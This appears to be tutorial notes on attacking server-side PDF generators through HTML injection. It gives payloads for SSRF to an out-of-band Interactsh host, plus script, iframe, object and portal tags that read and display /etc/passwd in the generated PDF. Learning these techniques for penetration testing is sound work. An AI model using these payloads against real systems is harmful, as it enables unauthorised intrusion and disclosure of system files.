

One of the most common vulnerabilities in combination with PDF generation is Server-Side Request Forgery (SSRF). 

Since HTML documents commonly load resources such as stylesheets or images from external sources, displaying an HTML document inherently requires the server to send requests to these external sources to fetch them. Since we can inject arbitrary HTML code into the PDF generator's input, we can force the server to send such a GET request to any URL we choose, including internal web applications.

We can inject many different HTML tags to force the server to send an HTTP request. For instance, we can inject an image tag pointing to a URL under our control to confirm SSRF. As an example, we are going to use the img tag with a domain from Interactsh:

Code: html
```
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
```

Similarly, we can also inject a stylesheet using the link tag:

Code: html
```
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
```
Generally, for images and stylesheets, the response is not displayed in the generated PDF such that we have a blind SSRF vulnerability which restricts our ability to exploit it. However, depending on the (mis-)configuration of the PDF generation library, we can inject other HTML elements that can trigger a request and make the server display the response. An example of this is an iframe:

Code: html
```
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
```
##
##

```
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```
##
##
```
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

##
##
```
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

##
##

Without JavaScript Execution
If the backend does not execute our injected JavaScript code, we must use other HTML tags to display local files. We can try the following payloads:

Code: html
```
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
